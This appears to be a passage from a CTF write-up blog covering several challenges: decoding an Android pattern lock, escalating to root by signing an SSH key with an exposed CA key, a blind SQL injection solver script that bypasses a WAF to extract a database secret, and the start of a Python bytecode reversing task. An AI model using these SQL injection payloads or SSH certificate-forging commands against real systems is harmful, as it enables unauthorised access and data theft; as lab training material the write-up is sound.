    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="n">rcode</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</code></pre></div></div>

<p>Which is a python 2.7 script to decrypt the pattern lock, you get the this output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[:D] The pattern has been FOUND!!! =&gt; 6304258
[+] Gesture:

  -----  -----  -----
  | 3 |  |   |  | 5 |
  -----  -----  -----
  -----  -----  -----
  | 2 |  | 4 |  | 6 |
  -----  -----  -----
  -----  -----  -----
  | 1 |  |   |  | 7 |
  -----  -----  -----
</code></pre></div></div>

<p>However, if you input <code class="language-plaintext highlighter-rouge">Flag{6304258}</code> it will be incorrect as the pattern represents touch points on the screen, and the pattern is not the same as the phone keypad, The typical phone keypad is:</p>

<p>PS: i tried the <code class="language-plaintext highlighter-rouge">Flag{6304258}</code> it didn’t work =P</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  -----  -----  -----
  | 1 |  | 2 |  | 3 |
  -----  -----  -----
  -----  -----  -----
  | 4 |  | 5 |  | 6 |
  -----  -----  -----
  -----  -----  -----
  | 7 |  | 8 |  | 9 |
  -----  -----  -----
         -----
         | 0 |
         -----
</code></pre></div></div>

<p>So from the pattern above we can deduce the following <code class="language-plaintext highlighter-rouge">1=7, 2=4, 3=1, 4=5, 5=3, 6=6, 7=9</code></p>

<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{7415369}</code></p>

<hr />

<h1 id="new-year-challenge-2025--authorizer">New Year Challenge 2025 » Authorizer</h1>

<p>Machines / Medium / 100 (pts)</p>

<p>Description:</p>

<p>They say that you are a certified hacker, PROVE IT.</p>

<hr />

<p>The challenge is a machine which you need to privilege escalate to root, signing into the machine, you immediately notice the <code class="language-plaintext highlighter-rouge">server.ca</code> file, first i thought it was a certificate file to access hidden website or something, however that lead to no where, looking at <code class="language-plaintext highlighter-rouge">server.ca</code> you notice it’s owned by root, checking <code class="language-plaintext highlighter-rouge">/etc/ssh/sshd_config</code> you notice curios things like</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TrustedUserCAKeys /root/server.ca.pub
PubkeyAuthentication yes
PermitRootLogin yes
</code></pre></div></div>

<p>So, the expected thing is to generate SSH key sign it with <code class="language-plaintext highlighter-rouge">server.ca</code> and then logon as root. Running the following commands will generate RSA key sign it with <code class="language-plaintext highlighter-rouge">server.ca</code> and then logon as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048 <span class="nt">-f</span> user_key <span class="nt">-C</span> <span class="s2">"user@example"</span>
<span class="nv">$ </span>ssh-keygen <span class="nt">-s</span> server.ca <span class="nt">-I</span> user@example <span class="nt">-n</span> root <span class="nt">-V</span> +52w user_key.pub
<span class="nv">$ </span>ssh <span class="nt">-i</span> ./user_key root@localhost
</code></pre></div></div>

<p>You will be logged as root with has access to <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></p>

<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{QCFAVnY4NG1NemZRYWladzROUFRoQXJhd1loOW9PazgyekJtQVFBeExNTTJ4TExPUVhLSVVHVWY5UW1oMmlHdGFjM1FXdWFaRjdsV0ovbXFGTXJiYWl2OEd2WWNzY1pqYnZ1Q2RGZTQ2RERXazg9MDdjNzI4YjE4NTUzZDA3OA==}</code></p>

<hr />

<h1 id="new-year-challenge-2025--harsq">New Year Challenge 2025 » Harsq</h1>
<p>Web Security / hard / 200 (pts)
Flag Format: Flag{}
Description:</p>

<p>This is the secret of MySeqret can you secret what my secret.</p>

<hr />

<p>The challenge is a web application, clicking around, you find 3 possible exploitation points, <code class="language-plaintext highlighter-rouge">/contact</code>, <code class="language-plaintext highlighter-rouge">/register_h-arsq</code> and <code class="language-plaintext highlighter-rouge">/login_h-arsq</code>. Checking each one for possible SQL injections, lead to nowhere, However, you receive an JWT token, after decoding it’s we know it’s flask app, I spent a whole day attacking the token hoping that might lead to the admin account which might contain the flag. Sadly this effort is wasted. There was an extra endpoint <code class="language-plaintext highlighter-rouge">/profile?id=2</code> which only shows up after you sign-in, sending simple <code class="language-plaintext highlighter-rouge">2'</code> test results in <code class="language-plaintext highlighter-rouge">500</code> response</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> <span class="ne">INTERNAL SERVER ERROR</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.27.1</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 08 Jan 2025 18:29:51 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">17</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Cookie</span>

An error occurred
</code></pre></div></div>

<p>Testing for simple <code class="language-plaintext highlighter-rouge">1 or 1=1</code> results in <code class="language-plaintext highlighter-rouge">200</code> response.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.27.1</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 08 Jan 2025 18:30:54 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3477</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Cookie</span>
</code></pre></div></div>

<p>So we are definitely dealing with SQL injection attack, so i prep to try data extraction using <code class="language-plaintext highlighter-rouge">1 union select 1,2,3</code> which lead to  <code class="language-plaintext highlighter-rouge">401</code> response</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">UNAUTHORIZED</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.27.1</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 08 Jan 2025 18:32:19 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">13</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Cookie</span>

Hack detected
</code></pre></div></div>

<p>So we are dealing with some sort of WAF. Many hours later i was able to gather at least some information about the database using simple recon and word-lists, i was able to guess there are 5 columns by using <code class="language-plaintext highlighter-rouge">1 ORDER BY N</code> and changing N in ascending order, trying <code class="language-plaintext highlighter-rouge">1 #ORDER BY 6</code> results in <code class="language-plaintext highlighter-rouge">200</code> so we are dealing with MySQL database as <code class="language-plaintext highlighter-rouge">#</code> is MySQL specific, trying to guess the database version was little harder as i had to rely on blind test as well <code class="language-plaintext highlighter-rouge">1 AND @@version&gt;5.7 AND 5.8&lt;@@version</code>, so i estimated the database to be in <code class="language-plaintext highlighter-rouge">5.x</code> range., Understanding that there are hard filters in place even when URL encoding i built script to run thru all possible blocked operations, i found out the following are blocked <code class="language-plaintext highlighter-rouge">/select|like|into|regexp|\(|\)|\[|\]|\~|\^/i</code> and probably more.</p>

<p>At this point it was end of day 2 of and starting to feel bad, i searched everywhere for a way to bypass the <code class="language-plaintext highlighter-rouge">select</code> filter, using different cases, adding comments, and there was nothing. I developed a small script to guess columns using a word-list, i found the following columns <code class="language-plaintext highlighter-rouge">id, name, password, email, secret</code> this matches the number of the columns i got via <code class="language-plaintext highlighter-rouge">1 ORDER BY N</code>, at this point it become clear we are supposed to find a way to get the value of <code class="language-plaintext highlighter-rouge">secret</code> column, given the description.</p>

<p>So i went back to very old blogs about 5.x era and looked for ways, turns out you can do the following in MySQL 5.x probably 8.x as well <code class="language-plaintext highlighter-rouge">column &gt;= flagA AND column &lt; flagB</code> which to my surprise it did work as we already know that the flag starts with <code class="language-plaintext highlighter-rouge">Flag{</code>, i quickly made a script to do blind attack going thru the list of all possible characters, that wasn’t very smart, MySQL was in case-insensitive mode, thus <code class="language-plaintext highlighter-rouge">A</code> and <code class="language-plaintext highlighter-rouge">a</code> are the same. Searching around It seems it possible to force binary comparison, that did the trick until it didn’t the search was generating garbage as i wasn’t sorting the list and there was characters which cause problems, so in the end i had to manually craft a characters list for it to work correctly.</p>

<p>PS: bonus point, the password for <code class="language-plaintext highlighter-rouge">admin@harsq.com</code> is <code class="language-plaintext highlighter-rouge">admin</code> =)</p>

<p>Anyway, the solver script as the following</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">backoff</span><span class="p">(</span><span class="n">delay</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">retries</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">decorator</span><span class="p">(</span><span class="n">func</span><span class="p">):</span>
        <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
            <span class="n">current_retry</span> <span class="o">=</span> <span class="mi">0</span>
            <span class="n">current_delay</span> <span class="o">=</span> <span class="n">delay</span>
            <span class="k">while</span> <span class="n">current_retry</span> <span class="o">&lt;</span> <span class="n">retries</span><span class="p">:</span>
                <span class="k">try</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">func</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
                <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                    <span class="n">current_retry</span> <span class="o">+=</span> <span class="mi">1</span>
                    <span class="k">if</span> <span class="n">current_retry</span> <span class="o">&gt;=</span> <span class="n">retries</span><span class="p">:</span>
                        <span class="k">raise</span> <span class="n">e</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Failed to execute function '</span><span class="si">{</span><span class="n">func</span><span class="p">.</span><span class="n">__name__</span><span class="si">}</span><span class="s">'. '</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s">' Retrying in </span><span class="si">{</span><span class="n">current_delay</span><span class="si">}</span><span class="s"> seconds..."</span><span class="p">)</span>
                    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">current_delay</span><span class="p">)</span>
                    <span class="n">current_delay</span> <span class="o">*=</span> <span class="mi">2</span>

        <span class="k">return</span> <span class="n">wrapper</span>

    <span class="k">return</span> <span class="n">decorator</span>

<span class="k">def</span> <span class="nf">next_in_set</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">sorted_chars</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">sorted_chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">sorted_chars</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
    <span class="k">return</span> <span class="bp">None</span>

<span class="o">@</span><span class="n">backoff</span><span class="p">(</span><span class="n">retries</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">delay</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">is_condition_true</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
    <span class="n">c2</span> <span class="o">=</span> <span class="n">next_in_set</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">c2</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 AND secret COLLATE utf8mb4_bin &gt;= '</span><span class="si">{</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">c</span><span class="si">}</span><span class="s">' AND secret COLLATE utf8mb4_bin &lt; '</span><span class="si">{</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">c2</span><span class="si">}</span><span class="s">'"</span>
        
    <span class="k">else</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"1 AND secret COLLATE utf8mb4_bin &gt;= '</span><span class="si">{</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">c</span><span class="si">}</span><span class="s">'"</span>

    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s">"/profile"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"id"</span><span class="p">:</span> <span class="n">payload</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">400</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[X] Unknown state '</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">': </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="si">}</span><span class="s"> &amp; </span><span class="si">{</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

    <span class="k">return</span> <span class="bp">False</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"http:/challenge-url.cybertalentslabs.com"</span>
<span class="n">FILTERED</span> <span class="o">=</span> <span class="p">[</span><span class="s">"("</span><span class="p">,</span> <span class="s">")"</span><span class="p">,</span> <span class="s">"["</span><span class="p">,</span> <span class="s">"]"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"'"</span><span class="p">,</span> <span class="s">"`"</span><span class="p">,</span> <span class="s">"'"</span><span class="p">,</span> <span class="s">'"'</span><span class="p">,</span> <span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">"~"</span><span class="p">]</span>
<span class="n">GUESS_SET</span> <span class="o">=</span> <span class="s">"!$&amp;-0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz}="</span>
<span class="n">sorted_chars</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">GUESS_SET</span><span class="p">))</span>  <span class="c1"># ensure ascending ASCII order
</span><span class="n">prefix</span> <span class="o">=</span> <span class="s">"Flag{"</span>
<span class="n">max_len</span> <span class="o">=</span> <span class="mi">120</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Checking: </span><span class="si">{</span><span class="n">sorted_chars</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Logging in..."</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
    <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s">/login_h-arsq"</span><span class="p">,</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"email"</span><span class="p">:</span> <span class="s">"admin@harsq.com"</span><span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">},</span>
    <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
<span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>

<span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">found_char</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">sorted_chars</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">FILTERED</span><span class="p">:</span>
            <span class="k">continue</span>

        <span class="k">if</span> <span class="n">is_condition_true</span><span class="p">(</span><span class="n">prefix</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
            <span class="n">prefix</span> <span class="o">+=</span> <span class="n">c</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Found character #</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s">: '</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">' =&gt; Current prefix = '</span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
            <span class="n">found_char</span> <span class="o">=</span> <span class="n">c</span>
            <span class="k">break</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">found_char</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] No more characters matched. Stopping."</span><span class="p">)</span>
        <span class="k">break</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Done! Guessed flag (so far): </span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

</code></pre></div></div>

<p>After running the script you should get something like</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Found character <span class="c">#1: 'Q' =&gt; Current prefix = 'Flag{Q'</span>
<span class="o">[</span>+] Found character <span class="c">#2: 'C' =&gt; Current prefix = 'Flag{QC'</span>
<span class="o">[</span>+] Found character <span class="c">#3: 'F' =&gt; Current prefix = 'Flag{QCF'</span>
<span class="o">[</span>+] Found character <span class="c">#4: 'A' =&gt; Current prefix = 'Flag{QCFA'</span>
<span class="o">[</span>+] Found character <span class="c">#5: 'T' =&gt; Current prefix = 'Flag{QCFAT'</span>
<span class="o">[</span>+] Found character <span class="c">#6: 'E' =&gt; Current prefix = 'Flag{QCFATE'</span>
Failed to execute <span class="k">function</span> <span class="s1">'is_condition_true'</span><span class="nb">.</span> <span class="s1">'('</span>Connection aborted.<span class="s1">', RemoteDisconnected('</span>Remote end closed connection without response<span class="s1">'))'</span> Retrying <span class="k">in </span>2 seconds...
<span class="o">[</span>+] Found character <span class="c">#7: 'N' =&gt; Current prefix = 'Flag{QCFATEN'</span>
Failed to execute <span class="k">function</span> <span class="s1">'is_condition_true'</span><span class="nb">.</span> <span class="s1">'('</span>Connection aborted.<span class="s1">', RemoteDisconnected('</span>Remote end closed connection without response<span class="s1">'))'</span> Retrying <span class="k">in </span>2 seconds...
<span class="o">[</span>+] Found character <span class="c">#8: 'Z' =&gt; Current prefix = 'Flag{QCFATENZ'</span>
<span class="o">[</span>+] Found character <span class="c">#9: 'c' =&gt; Current prefix = 'Flag{QCFATENZc'</span>
...many characters later
</code></pre></div></div>

<p>The flag is <code class="language-plaintext highlighter-rouge">Flag{QCFATENZc1NrbG90b2hKTTJJdnNDckZEdWxPZ1ZvR1Q4cFNpRVRkK0YxS0p2OD1hOGY1OGFhN2I4ZDE2ZGVh}</code></p>

<hr />

<h1 id="new-year-challenge-2025--pyrewind">New Year Challenge 2025 » PyRewind</h1>
<p>Malware Reverse Engineering / Hard / 200 (pts)</p>

<p>Description:</p>

<p>I have always asked myself how python works under the hood! and you are given a <code class="language-plaintext highlighter-rouge">main.pyc</code> file, which is a compiled python file.</p>

<hr />

<p>So we are dealing with a compiled python file, to de-compile it i tried using <code class="language-plaintext highlighter-rouge">uncompyle6</code> and <code class="language-plaintext highlighter-rouge">decompyle3</code> but sadly neither worked, i then tried <code class="language-plaintext highlighter-rouge">pycdc</code> which managed to de-compile the script partially, however it failed to generate complete script, as the source pyc file is using <code class="language-plaintext highlighter-rouge">3.12</code> which <code class="language-plaintext highlighter-rouge">pycdc</code> is not compatible with yet. Looking around i found <a href="https://pylingual.io">pylingual</a> which is a new de-compiler that supports <code class="language-plaintext highlighter-rouge">3.12</code> and it worked like a charm, the de-compiled script looks like the following</p>

<p>After de-compiling you get the following script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">marshal</span>
<span class="kn">import</span> <span class="nn">types</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">b</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xcb\r\r\n\x00\x00\x00\x00\xdb\xcd\xcb</span><span class="s">f</span><span class="se">\x89\x10\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xf3\x18\x00\x00\x00\x97\x00</span><span class="s">d</span><span class="se">\x00</span><span class="s">d</span><span class="se">\x01</span><span class="s">l</span><span class="se">\x00</span><span class="s">Z</span><span class="se">\x00</span><span class="s">d</span><span class="se">\x02</span><span class="s">e</span><span class="se">\x01</span><span class="s">f</span><span class="se">\x02</span><span class="s">d</span><span class="se">\x03\x84\x04</span><span class="s">Z</span><span class="se">\x02</span><span class="s">y</span><span class="se">\x01</span><span class="s">)</span><span class="se">\x04\xe9\x00\x00\x00\x00</span><span class="s">N</span><span class="se">\xda\x06</span><span class="s">returnc</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\xfe\x10\x00\x00\x97\x00</span><span class="s">|</span><span class="se">\x00</span><span class="s">j</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x01\xab\x01\x00\x00\x00\x00\x00\x00</span><span class="s">}</span><span class="se">\x01</span><span class="s">t</span><span class="se">\x03\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">|</span><span class="se">\x01\xab\x01\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x02</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x05</span><span class="s">d</span><span class="se">\x06\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x06</span><span class="s">d</span><span class="se">\x07\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x00\x00\x00</span><span class="s">d</span><span class="se">\x08</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x06</span><span class="s">d</span><span class="se">\x07\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x07</span><span class="s">d</span><span class="se">\t\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\n\x00\x00</span><span class="s">d</span><span class="se">\n</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x07</span><span class="s">d</span><span class="se">\t\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\t</span><span class="s">d</span><span class="se">\x0b\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x0c\x00\x00</span><span class="s">d</span><span class="se">\x0c</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\t</span><span class="s">d</span><span class="se">\x0b\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x0b</span><span class="s">d</span><span class="se">\r\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x05\x00\x00</span><span class="s">d</span><span class="se">\x0e</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span class="se">\x01</span><span class="s">y</span><span class="se">\x03</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\x0b</span><span class="s">d</span><span class="se">\r\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">t</span><span class="se">\x05\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">j</span><span class="se">\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x04</span><span class="s">|</span><span class="se">\x01</span><span class="s">d</span><span class="se">\r</span><span class="s">d</span><span class="se">\x0c\x1a\x00\xab\x02\x00\x00\x00\x00\x00\x00</span><span class="s">d</span><span class="se">\x05\x19\x00\x00\x00</span><span class="s">z</span><span class="se">\x01\x00\x00</span><span class="s">d</span><span class="se">\x0f</span><span class="s">k7</span><span class="se">\x00\x00</span><span class="s">r</span><span 